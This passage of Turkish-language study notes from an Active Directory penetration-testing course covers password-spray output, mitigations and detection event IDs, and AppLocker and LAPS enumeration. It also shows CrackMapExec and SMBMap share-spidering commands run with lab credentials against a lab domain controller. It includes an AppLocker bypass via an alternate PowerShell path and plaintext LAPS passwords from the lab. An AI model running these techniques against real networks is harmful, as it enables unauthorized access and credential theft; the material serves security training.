[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

Önceki bölümde gösterilen aynı kullanıcı numaralandırma ve püskürtme adımlarını gerçekleştirmek için Kerbrute'u da kullanabiliriz. Sağlanan Windows hostundan aynı örnekler üzerinde çalışmak isterseniz araç `C:\Tools` dizininde mevcuttur.


## **Hafifletmeler**
Parola püskürtme saldırıları riskini azaltmak için çeşitli adımlar atılabilir. Tek bir çözüm saldırıyı tamamen önleyemeyecek olsa da, derinlemesine savunma yaklaşımı parola püskürtme saldırılarını son derece zor hale getirecektir.

`Multi-factor Authentication (Çok Faktörlü Kimlik Doğrulama) :` Çok faktörlü kimlik doğrulama, parola püskürtme saldırıları riskini büyük ölçüde azaltabilir. Mobil cihaza gönderilen anlık bildirimler, Google Authenticator gibi dönen Tek Kullanımlık Şifre (OTP), RSA anahtarı veya kısa mesaj onayları gibi birçok çok faktörlü kimlik doğrulama türü mevcuttur. Bu, bir saldırganın bir hesaba erişim kazanmasını engelleyebilse de, bazı çok faktörlü uygulamalar kullanıcı adı/parola kombinasyonunun geçerli olup olmadığını ifşa etmeye devam eder. Bu kimlik bilgilerinin diğer maruz kalınan hizmetler veya uygulamalarda yeniden kullanılması mümkün olabilir. Tüm harici portallarda çok faktörlü çözümlerin uygulanması önemlidir.

`Erişimi Kısıtlama :` Kullanıcının rolünün bir parçası olarak erişmesi gerekmese bile, genellikle herhangi bir domain kullanıcı hesabıyla uygulamalara giriş yapmak mümkündür. En az ayrıcalık ilkesi doğrultusunda, uygulamaya erişim ihtiyacı olanlarla sınırlandırılmalıdır.

`Başarılı İstismarın Etkisini Azaltma :` Ayrıcalıklı kullanıcıların her türlü idari faaliyet için ayrı bir hesaba sahip olmasını sağlamak hızlı bir kazanımdır. Mümkünse uygulamaya özel izin seviyeleri de uygulanmalıdır. Ağ segmentasyonu da önerilir çünkü bir saldırgan tehlikeye atılmış bir subnet'e izole edilirse, bu yanal hareketi ve daha fazla tehlikeye atmayı yavaşlatabilir veya tamamen durdurabilir.

`Password Hygiene:` Kullanıcıları parola cümleleri gibi tahmin edilmesi zor parolalar seçme konusunda eğitmek, parola püskürtme saldırısının etkinliğini önemli ölçüde azaltabilir. Ayrıca, yaygın sözlük kelimelerini, ay ve mevsim adlarını ve şirket adının varyasyonlarını kısıtlamak için bir parola filtresi kullanmak, bir saldırganın püskürtme girişimleri için geçerli bir parola seçmesini oldukça zorlaştıracaktır.


## **Diğer Hususlar**  

Domain parola kilitleme politikanızın hizmet reddi saldırıları riskini artırmadığından emin olmak çok önemlidir. Çok kısıtlayıcıysa ve hesapların kilidini manuel olarak açmak için yönetici müdahalesi gerektiriyorsa, dikkatsiz bir parola spreyi kısa bir süre içinde birçok hesabı kilitleyebilir.


## Detection
Dış parola püskürtme saldırılarının bazı göstergeleri arasında kısa süre içinde çok sayıda hesap kilitlenmesi, geçerli veya var olmayan kullanıcılarla çok sayıda oturum açma girişimi gösteren sunucu veya uygulama günlükleri veya belirli bir uygulamaya veya URL'ye kısa süre içinde çok sayıda istek yer alır.  

Domain Controller'ın güvenlik günlüğünde, olay kimliği [4625](“https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625”)'in birçok örneği: [Bir hesap](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) kısa bir süre içinde[oturum açamadı olayının](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) birçok örneği bir parola püskürtme saldırısına işaret ediyor olabilir. Kuruluşlar, bir uyarıyı tetiklemek için belirli bir zaman aralığında birçok oturum açma başarısızlığını ilişkilendirecek kurallara sahip olmalıdır. Daha bilgili bir saldırgan SMB parola püskürtme saldırısından kaçınabilir ve bunun yerine LDAP'yi hedef alabilir. Kuruluşlar ayrıca olay kimliği [4771'](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771)i de izlemelidir [:](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771) [Kerberos ön kimlik doğrulaması başarısız](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771) oldu , bu bir LDAP parola püskürtme girişimine işaret edebilir. Bunu yapmak için Kerberos günlüğünü etkinleştirmeleri gerekecektir. Bu [yazı](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing), Windows Güvenlik Olay Günlüğü kullanarak parola püskürtmeyi tespit etmeye yönelik araştırmayı detaylandırmaktadır.  

Bu hafifletme önlemleri hassas bir şekilde ayarlandığında ve günlük kaydı etkinleştirildiğinde, bir kuruluş dahili ve harici parola püskürtme saldırılarını tespit etmek ve bunlara karşı savunmak için iyi bir konuma sahip olacaktır.


## **External Password Spraying**
Bu modülün kapsamı dışında olmakla birlikte, parola püskürtme de saldırganların internette yer edinmek için kullandıkları yaygın bir yöntemdir. Sızma testleri sırasında e-posta gelen kutuları veya dışarıya bakan intranet siteleri gibi web uygulamaları aracılığıyla hassas verilere erişim elde etmek için bu yöntemle çok başarılı olduk. Bazı yaygın hedefler şunlardır:
- Microsoft 0365
- Outlook Web Exchange
- Exchange Web Access
- Skype for Business
- Lync Server
- Microsoft Remote Desktop Services (RDS) Portals
- Citrix portals using AD authentication
- VDI implementations using AD authentication such as VMware Horizon
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
- Custom web applications that use AD authentication

## **Daha Derine İnmek**  

Artık birkaç geçerli kimlik bilgisi setine sahip olduğumuza göre, çeşitli araçlarla kimlik bilgisi numaralandırması yaparak domainin daha derinlerine inmeye başlayabiliriz. Bize bir domain ortamının en eksiksiz ve doğru resmini vermek için birbirini tamamlayan çeşitli araçlar üzerinden yürüyeceğiz. Bu bilgilerle, değerlendirmemizin nihai hedefine ulaşmak için etki alanında yanal ve dikey olarak ilerlemeye çalışacağız.


Soru : Bu bölümde gösterilen örnekleri kullanarak Winter2022 şifresine sahip bir kullanıcı bulun. Kullanıcı adını cevap olarak gönderin.
Cevap : 
![Pasted image 20241019121400.png](/img/user/resimler/Pasted%20image%2020241019121400.png)



# **Security Controls'ün Numaralandırılması**
Bir yer edindikten sonra, bu erişimi hostların savunma durumu hakkında bir fikir edinmek için kullanabilir, görünürlüğümüz kısıtlı olmadığı için domain'i daha fazla numaralandırabilir ve gerekirse hostlarda lokal olarak bulunan araçları kullanarak "arazide yaşamaya" çalışabiliriz. Bir kuruluşta yürürlükte olan güvenlik kontrollerini anlamak önemlidir, çünkü kullanılan ürünler AD numaralandırmamız için kullandığımız araçların yanı sıra exploitation ve post-exploitation'ı da etkileyebilir. Karşı karşıya kalabileceğimiz korumaları anlamak, araç kullanımına ilişkin kararlarımızı bilgilendirmeye yardımcı olacak ve belirli araçlardan kaçınarak veya bunları değiştirerek hareket tarzımızı planlamamıza yardımcı olacaktır. Bazı kuruluşlar diğerlerine göre daha sıkı korumalara sahiptir ve bazıları güvenlik kontrollerini her yerde eşit şekilde uygulamaz. Belirli makinelere uygulanan ve numaralandırma işlemimizi zorlaştırabilecek politikalar diğer makinelere uygulanmıyor olabilir.

Not: Bu bölüm, bir domain içindeki olası güvenlik kontrollerini göstermeyi amaçlamaktadır, ancak etkileşimli bir bileşene sahip değildir. Güvenlik kontrollerinin numaralandırılması ve atlanması bu modülün kapsamı dışındadır, ancak bir değerlendirme sırasında karşılaşabileceğimiz olası teknolojilere genel bir bakış sunmak istedik.


## Windows Defender
Windows Defender (veya Windows 10 Mayıs 2020 Güncellemesinden sonra [Microsoft](https://en.wikipedia.org/wiki/Microsoft_Defender) Defender) yıllar içinde büyük ölçüde gelişmiştir ve varsayılan olarak `PowerView` gibi araçları engelleyecektir. Bu korumaları atlamanın yolları vardır. Bu yollar diğer modüllerde ele alınacaktır. Mevcut Defender durumunu almak için yerleşik PowerShell cmdlet'i [Get-MpComputerStatus'](“https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=win10-ps”) u kullanabiliriz. Burada, `RealTimeProtectionEnabled` parametresinin `True` olarak ayarlandığını görebiliriz, bu da Defender'ın sistemde etkin olduğu anlamına gelir.


#### **Get-MpComputerStatus ile Defender'ın Durumunu Kontrol Etme**
```powershell-session
PS C:\htb> Get-MpComputerStatus

AMEngineVersion                 : 1.1.17400.5
AMProductVersion                : 4.10.14393.0
AMServiceEnabled                : True
AMServiceVersion                : 4.10.14393.0
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 9/2/2020 11:31:50 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 1
AntivirusSignatureLastUpdated   : 9/2/2020 11:31:51 AM
AntivirusSignatureVersion       : 1.323.392.0
BehaviorMonitorEnabled          : False
ComputerID                      : 07D23A51-F83F-4651-B9ED-110FF2B83A9C
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : False
LastFullScanSource              : 0
LastQuickScanSource             : 2
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         :
NISSignatureVersion             : 0.0.0.0
OnAccessProtectionEnabled       : False
QuickScanAge                    : 0
QuickScanEndTime                : 9/3/2020 12:50:45 AM
QuickScanStartTime              : 9/3/2020 12:49:49 AM
RealTimeProtectionEnabled       : True
RealTimeScanDirection           : 0
PSComputerName                  :
```

## AppLocker
Uygulama beyaz listesi, bir sistemde bulunmasına ve çalıştırılmasına izin verilen onaylı yazılım uygulamalarının veya yürütülebilir dosyaların bir listesidir. Amaç, ortamı zararlı kötü amaçlı yazılımlardan ve bir kuruluşun belirli iş ihtiyaçlarıyla uyumlu olmayan onaylanmamış yazılımlardan korumaktır. [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker), Microsoft'un uygulama beyaz listeleme çözümüdür ve sistem yöneticilerine kullanıcıların hangi uygulamaları ve dosyaları çalıştırabileceği konusunda kontrol sağlar. Yürütülebilir dosyalar, komut dosyaları, Windows yükleyici dosyaları, DLL'ler, paketlenmiş uygulamalar ve paketlenmiş uygulama yükleyicileri üzerinde ayrıntılı denetim sağlar. Kuruluşların cmd.exe ve PowerShell.exe'yi ve belirli dizinlere yazma erişimini engellemesi yaygındır, ancak bunların tümü atlanabilir. Kuruluşlar ayrıca genellikle `PowerShell.exe` yürütülebilir dosyasını engellemeye odaklanır, ancak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.` `exe` gibi diğer `PowerShell` [yürütülebilir konumlarını](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) unuturlar. Aşağıda gösterilen `AppLocker` kurallarında durumun böyle olduğunu görebiliriz. Tüm Domain Kullanıcılarının şu adreste bulunan 64 bit PowerShell çalıştırılabilir dosyasını çalıştırmasına izin verilmez:

%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe

Böylece, sadece başka konumlardan çağırabiliriz. Bazen, atlamak için daha fazla yaratıcılık gerektiren daha katı `AppLocker` politikalarıyla karşılaşırız. Bu yollar diğer modüllerde ele alınacaktır.


#### **Get-AppLockerPolicy cmdlet'ini kullanma**
```powershell-session
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PathConditions      : {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 3d57af4a-6cf8-4e5b-acfc-c2c2956061fa
Name                : Block PowerShell
Description         : Blocks Domain Users from using PowerShell on workstations
UserOrGroupSid      : S-1-5-21-2974783224-3764228556-2640795941-513
Action              : Deny

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
Name                : (Default Rule) All files
Description         : Allows members of the local Administrators group to run all applications.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow
```

## **PowerShell Kısıtlı Dil Modu**
PowerShell [Kısıtlı Dil Modu](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/), COM nesnelerini engelleme, yalnızca onaylı .NET türlerine izin verme, XAML tabanlı iş akışları, PowerShell sınıfları ve daha fazlası gibi PowerShell'i etkili bir şekilde kullanmak için gereken birçok özelliği kilitler. Tam Dil Modu'nda mı yoksa Kısıtlı Dil Modu'nda mı olduğumuzu hızlı bir şekilde numaralandırabiliriz.


#### Enumerating Language Mode
```powershell-session
PS C:\htb> $ExecutionContext.SessionState.LanguageMode

ConstrainedLanguage
```


## LAPS
Microsoft [Yerel Yönetici Parolası Çözümü (LAPS)](“https://www.microsoft.com/en-us/download/details.aspx?id=46899”), Windows host'lardaki lokal yönetici parolalarını rastgele hale getirmek ve döndürmek ve yanal hareketi önlemek için kullanılır. LAPS yüklü makineler için hangi domain kullanıcılarının LAPS parola setini okuyabileceğini ve hangi makinelerde LAPS yüklü olmadığını listeleyebiliriz. LAPSToolkit bunu birkaç fonksiyonla büyük ölçüde kolaylaştırır. Bunlardan biri, LAPS'nin etkin olduğu tüm bilgisayarlar için `ExtendedRights` 'ı ayrıştırmaktır. Bu, LAPS parolalarını okumak için özel olarak yetkilendirilmiş grupları gösterecektir, bunlar genellikle korumalı gruplardaki kullanıcılardır. Bir bilgisayarı domain'e katan bir hesap, o host üzerinde `Tüm Genişletilmiş Haklara` sahip olur ve bu hak hesaba parolaları okuma yeteneği verir. Numaralandırma, bir host üzerinde LAPS parolasını okuyabilen bir kullanıcı hesabı gösterebilir. Bu, LAPS parolalarını okuyabilen belirli AD kullanıcılarını hedeflememize yardımcı olabilir.


#### **Find-LAPSDelegatedGroups'u Kullanma**
```powershell-session
PS C:\htb> Find-LAPSDelegatedGroups

OrgUnit                                             Delegated Groups
-------                                             ----------------
OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins
OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins
OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\Domain Admins
OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\LAPS Admins
OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\Domain Admins
OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\LAPS Admins
OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
```
`Find-AdmPwdExtendedRights`, okuma erişimi olan gruplar ve “Tüm `Genişletilmiş Haklar` ”a sahip kullanıcılar için LAPS'ın etkin olduğu her bilgisayardaki hakları kontrol eder. “Tüm Genişletilmiş Haklara” sahip kullanıcılar LAPS parolalarını okuyabilir ve temsilci gruplarındaki kullanıcılardan daha az korunuyor olabilir, bu nedenle bu kontrol edilmeye değerdir.


#### **Find-AdmPwdExtendedRights Kullanma**
```powershell-session
PS C:\htb> Find-AdmPwdExtendedRights

ComputerName                Identity                    Reason
------------                --------                    ------
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated
SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated
SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\LAPS Admins   Delegated
WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\Domain Admins Delegated
WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated
```
`Get-LAPSComputers` fonksiyonunu, parolaların süresi dolduğunda LAPS'ın etkin olduğu `bilgisayarları` ve hatta kullanıcımızın erişimi varsa rastgele parolaları açık metin olarak aramak için kullanabiliriz.


#### **Get-LAPSComputers Kullanımı**
```powershell-session
PS C:\htb> Get-LAPSComputers

ComputerName                Password       Expiration
------------                --------       ----------
DC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45
EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30
SQL01.INLANEFREIGHT.LOCAL   9G#f;p41dcAe,s 09/26/2020 00:30:09
WS01.INLANEFREIGHT.LOCAL    TCaG-F)3No;l8C 09/26/2020 00:46:04
```


## **Sonuç**
Bu bölümde gördüğümüz gibi, hangi korumaların yürürlükte olduğunu belirlemek için kullanabileceğimiz başka yararlı AD numaralandırma teknikleri de mevcuttur. Tüm bu araç ve tekniklere aşina olmanız ve bunları seçenek cephaneliğinize eklemeniz faydalı olacaktır. Şimdi INLANEFREIGHT.LOCAL domain'ini kimlik bilgileri açısından incelemeye devam edelim.


# Credentialed Enumeration - from Linux
Artık domain'de bir yer edindiğimize göre, düşük ayrıcalıklı domain kullanıcı kimlik bilgilerimizi kullanarak daha derine inmenin zamanı geldi. Domain'in kullanıcı tabanı ve makineleri hakkında genel bir fikre sahip olduğumuza göre, domain'i derinlemesine numaralandırmanın zamanı geldi. Domain kullanıcı ve bilgisayar öznitelikleri, grup üyeliği, Grup Politika Nesneleri, izinler, ACL'ler, güvenler ve daha fazlası hakkındaki bilgilerle ilgileniyoruz. Çeşitli seçeneklerimiz var, ancak unutulmaması gereken en önemli şey, bu araçların çoğunun herhangi bir izin düzeyinde geçerli domain kullanıcı kimlik bilgileri olmadan çalışmayacağıdır. Bu nedenle, en azından, bir kullanıcının açık metin parolasını, NTLM parola karmasını veya domain'e bağlı bir hostta SYSTEM erişimini elde etmiş olmamız gerekecektir.

Takip etmek için, bu bölümün altındaki hedefi oluşturun ve `htb-student` kullanıcısı olarak Linux saldırı hostuna SSH yapın. ATTACK01 Parrot Linux host'unda yüklü araçları kullanarak INLANEFREIGHT.LOCAL domain'inin numaralandırılması için aşağıdaki kimlik bilgilerini kullanacağız: `Kullanıcı=forend` ve `şifre=Klmcargo2`. Erişimimiz sağlandıktan sonra, işe koyulma zamanı. `CrackMapExec` ile başlayacağız.

## CrackMapExec
[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (CME), AD ortamlarının değerlendirilmesine yardımcı olan güçlü bir araç setidir. Fonksiyonlarını yerine getirmek için Impacket ve PowerSploit araç setlerindeki paketleri kullanır. Aracı ve beraberindeki modülleri kullanma hakkında ayrıntılı açıklamalar için [wiki](https://github.com/byt3bl33d3r/CrackMapExec/wiki)'ye bakın. Mevcut seçenekleri ve sözdizimini gözden geçirmek için `-h` bayrağını kullanmaktan çekinmeyin.

#### CME Help Menu
```shell-session
$ crackmapexec -h
```
Aracı MSSQL, SMB, SSH ve WinRM kimlik bilgileriyle kullanabileceğimizi görebiliriz. SMB protokolü ile CME için seçeneklerimize bakalım:

#### CME Options (SMB)
```shell-session
crackmapexec smb -h
```
CME her protokol için bir yardım menüsü sunar (örn. `crackmapexec winrm -h`, vb.). Yardım menüsünün tamamını ve tüm olası seçenekleri gözden geçirdiğinizden emin olun. Şimdilik ilgilendiğimiz bayraklar şunlardır:

- -u Kullanıcı Adı `Kimlik doğrulamak için kimlik bilgilerini kullanacağımız` kullanıcı  
    
- -p `Şifre Kullanıcının şifresi`  
    
- Hedef (IP veya FQDN) `Numaralandırılacak hedef host` (bizim durumumuzda Domain Controller)  
    
- -- `users Domain Kullanıcılarını listelemek için belirtir`  
    
- --groups `Domain gruplarını listelemek için belirtir`  
    
- --loggedon-users `Varsa, bir hedefte hangi kullanıcıların oturum açtığını listelemeye çalışır`


Kullanıcıları ve grupları listelemek için SMB protokolünü kullanarak başlayacağız. Domain Controller'ı (adresini daha önce ortaya çıkardığımız) hedef alacağız çünkü ilgilendiğimiz domain veritabanındaki tüm verileri o tutuyor. Tüm komutları `sudo` ile başlattığınızdan emin olun.


#### CME - Domain User Enumeration
CME'yi Domain Controller'a yönlendirerek ve tüm domain kullanıcılarının bir listesini almak için `forend` kullanıcısının kimlik bilgilerini kullanarak başlıyoruz. Bize kullanıcı bilgilerini sağlarken [badPwdCount](https://docs.microsoft.com/en-us/windows/win32/adschema/a-badpwdcount) özniteliği gibi veri noktaları içerdiğine dikkat edin. Bu, hedefli parola püskürtme gibi eylemler gerçekleştirirken faydalıdır. Herhangi bir hesabı kilitlememek için ekstra dikkatli olmak amacıyla `badPwdCount` özniteliği 0'ın üzerinde olan tüm kullanıcıları filtreleyen bir hedef kullanıcı listesi oluşturabiliriz.

![Pasted image 20241019172430.png](/img/user/resimler/Pasted%20image%2020241019172430.png)

![Pasted image 20241019172444.png](/img/user/resimler/Pasted%20image%2020241019172444.png)
Domain gruplarının tam bir listesini de elde edebiliriz. Raporlama veya diğer araçlarla kullanım amacıyla daha sonra tekrar kolayca erişebilmek için tüm çıktılarımızı dosyalara kaydetmeliyiz.

#### CME - Domain Group Enumeration
![Pasted image 20241019173241.png](/img/user/resimler/Pasted%20image%2020241019173241.png)

Yukarıdaki kod parçacığı, domain içindeki grupları ve her birindeki kullanıcı sayısını listeler. Çıktı ayrıca Domain Controller üzerindeki `Backup Operators` gibi built-in grupları da gösterir. İlgilendiğimiz grupları not etmeye başlayabiliriz. `Administrators (Yöneticiler`), `Domain Admins`( `Domain` `Yöneticileri`), `Executives`( `Yöneticiler`), privileged IT admins (ayrıcalıklı BT yöneticileri) vb. gibi anahtar grupları not edin. Bu gruplar muhtemelen değerlendirmemiz sırasında hedef almaya değer yüksek ayrıcalıklara sahip kullanıcılar içerecektir.

#### **CME - Oturum Açmış Kullanıcılar**  

CME'yi diğer hostları hedeflemek için de kullanabiliriz. Şu anda hangi kullanıcıların oturum açtığını görmek için bir file server gibi görünen şeyi kontrol edelim.
![Pasted image 20241019173451.png](/img/user/resimler/Pasted%20image%2020241019173451.png)
![Pasted image 20241019173457.png](/img/user/resimler/Pasted%20image%2020241019173457.png)

Bu sunucuda birçok kullanıcının oturum açtığını görüyoruz ki bu çok ilginç. Ayrıca `forend` kullanıcımızın lokal bir yönetici olduğunu da görebiliyoruz çünkü araç hedef hostta başarılı bir şekilde kimlik doğrulaması yaptıktan sonra `(Pwn3d!) yazısı` beliriyor `.` Bunun gibi bir host, yönetici kullanıcılar tarafından bir atlama hostu veya benzeri olarak kullanılabilir. Daha önce domain admin olarak tanımladığımız `svc_qualys` kullanıcısının oturum açtığını görebiliriz. Bu kullanıcının kimlik bilgilerini bellekten çalabilir ya da taklit edebilirsek kolay bir kazanç elde edebiliriz.

Daha sonra göreceğimiz gibi, `BloodHound` (ve `PowerView` gibi diğer araçlar) kullanıcı oturumlarını avlamak için kullanılabilir. BloodHound, Domain User oturumlarını birçok şekilde grafiksel ve hızlı bir şekilde görüntülemek için kullanabileceğimiz için özellikle güçlüdür. Ne olursa olsun, CME gibi araçlar daha hedefli numaralandırma ve kullanıcı avı için harikadır.

#### **CME Share Arama**  

Remote host üzerindeki mevcut paylaşımları ve kullanıcı hesabımızın her bir paylaşıma sahip olduğu erişim seviyesini (READ veya WRITE erişimi) listelemek için `--shares` bayrağını kullanabiliriz `.` Bunu INLANEFREIGHT.LOCAL Domain Controller'a karşı çalıştıralım.

#### Share Enumeration - Domain Controller
![Pasted image 20241019180101.png](/img/user/resimler/Pasted%20image%2020241019180101.png)

`READ` erişimi ile kullanabileceğimiz birkaç paylaşım görüyoruz. `Department Shares`, `User Shares` ve `ZZZ_archive` `paylaşımları`, parolalar veya PII gibi hassas veriler içerebileceğinden daha fazla araştırmaya değer olacaktır. Daha sonra, paylaşımları inceleyebilir ve her bir dizinde dosya arayabiliriz. `spider_plus` modülü host üzerindeki her okunabilir paylaşımı inceleyecek ve tüm okunabilir dosyaları listeleyecektir. Hadi bir deneyelim.


#### Spider_plus
```shell-session
M1R4CKCK@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

![Pasted image 20241019180333.png](/img/user/resimler/Pasted%20image%2020241019180333.png)

Yukarıdaki komutta, spider `'`ı `Deparment Shares`'e karşı çalıştırdık. Tamamlandığında, CME sonuçları `/tmp/cme_spider_plus/<ip of host>` adresinde bulunan bir JSON dosyasına yazar. Aşağıda JSON çıktısının bir kısmını görebiliriz. Parola içerebilecek `web.config` dosyaları veya komut dosyaları gibi ilginç dosyaları araştırabiliriz. Daha fazla araştırmak istersek, bu dosyaları çekerek içinde ne olduğunu görebilir, belki de kodlanmış kimlik bilgilerini veya diğer hassas bilgileri bulabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 

{
    "Department Shares": {
        "Accounting/Private/AddSelect.bat": {
            "atime_epoch": "2022-03-31 14:44:42",
            "ctime_epoch": "2022-03-31 14:44:39",
            "mtime_epoch": "2022-03-31 15:14:46",
            "size": "278 Bytes"
        },
        "Accounting/Private/ApproveConnect.wmf": {
            "atime_epoch": "2022-03-31 14:45:14",
     
<SNIP>
```

CME güçlüdür ve bu sadece yeteneklerine küçük bir bakış; laboratuvar hedeflerine karşı daha fazla denemeye değer. Bu modülün geri kalanında ilerledikçe CME'yi çeşitli şekillerde kullanacağız. Şimdi devam edelim ve [SMBMap](https://github.com/ShawnDEvans/smbmap) 'e bir göz atalım.


## SMBMap
SMBMap, bir Linux saldırı hostundan SMB paylaşımlarını numaralandırmak için harikadır. Erişilebilirse paylaşımların, izinlerin ve paylaşım içeriklerinin bir listesini toplamak için kullanılabilir. Erişim sağlandıktan sonra, dosya indirmek ve yüklemek ve uzak komutları çalıştırmak için kullanılabilir.  

CME gibi, SMBMap'i ve bir dizi domain kullanıcı kimlik bilgisini kullanarak remote sistemlerdeki erişilebilir paylaşımları kontrol edebiliriz. Diğer araçlarda olduğu gibi, araç kullanım menüsünü görüntülemek için `smbmap` `-h` komutunu yazabiliriz. Paylaşımları listelemenin yanı sıra, SMBMap'i dizinleri özyinelemeli olarak listelemek, bir dizinin içeriğini listelemek, dosya içeriğini aramak ve daha fazlası için kullanabiliriz. Bu özellikle yararlı bilgiler için paylaşımları yağmalarken faydalı olabilir.


#### **Erişimi Kontrol Etmek İçin SMBMap**

![Pasted image 20241019180944.png](/img/user/resimler/Pasted%20image%2020241019180944.png)

Yukarıdakiler bize kullanıcımızın nelere erişebileceğini ve izin seviyelerini söyleyecektir. CME'deki sonuçlarımızda olduğu gibi, `forend` kullanıcısının `ADMIN$` veya `C$` paylaşımları üzerinden DC'ye erişimi olmadığını (standart bir kullanıcı hesabı için beklenen budur), ancak `IPC$`, `NETLOGON` ve `SYSVOL` üzerinden okuma erişimine sahip olduğunu görüyoruz. `Department Shares` ve kullanıcı ve arşiv paylaşımları gibi diğer standart olmayan paylaşımlar en ilginç olanlarıdır. `Departman Paylaşımları` paylaşımındaki dizinlerin özyinelemeli bir listesini yapalım. Beklendiği gibi, şirketteki her departman için alt dizinler görebiliriz.

#### **Tüm Dizinlerin Rekürsif Listesi**
```shell-session
$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```
![Pasted image 20241019181044.png](/img/user/resimler/Pasted%20image%2020241019181044.png)
